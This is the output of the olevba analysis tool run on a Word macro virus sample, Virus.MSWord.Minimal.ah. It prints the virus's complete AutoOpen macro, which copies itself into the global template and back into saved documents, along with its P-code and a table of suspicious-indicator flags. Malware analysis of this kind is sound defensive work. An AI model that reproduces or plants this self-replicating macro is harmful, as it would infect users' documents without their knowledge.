olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Minimal.ah
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Minimal.ah - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoopeN.bas 
in file: Virus.MSWord.Minimal.ah - OLE stream: 'Macros/VBA/AutoopeN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim c$
Dim a$
Dim b$
On Error Resume Next: c$ = ":aUtOoPen": a$ = WordBasic.[FileName$]() + c$: b$ = "Global" + c$: WordBasic.MacroCopy a$, b$: WordBasic.FileSaveAs Format:=1: WordBasic.MacroCopy b$, a$
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Minimal.ah
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoopeN - 1749 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn c
' Line #3:
' 	Dim 
' 	VarDefn a
' Line #4:
' 	Dim 
' 	VarDefn B
' Line #5:
' 	OnError (Resume Next) 
' 	BoS 0x0000 
' 	LitStr 0x0009 ":aUtOoPen"
' 	St c$ 
' 	BoS 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	Ld c$ 
' 	Add 
' 	St a$ 
' 	BoS 0x0000 
' 	LitStr 0x0006 "Global"
' 	Ld c$ 
' 	Add 
' 	St B$ 
' 	BoS 0x0000 
' 	Ld a$ 
' 	Ld B$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' 	BoS 0x0000 
' 	Ld B$ 
' 	Ld a$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #6:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoopeN            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

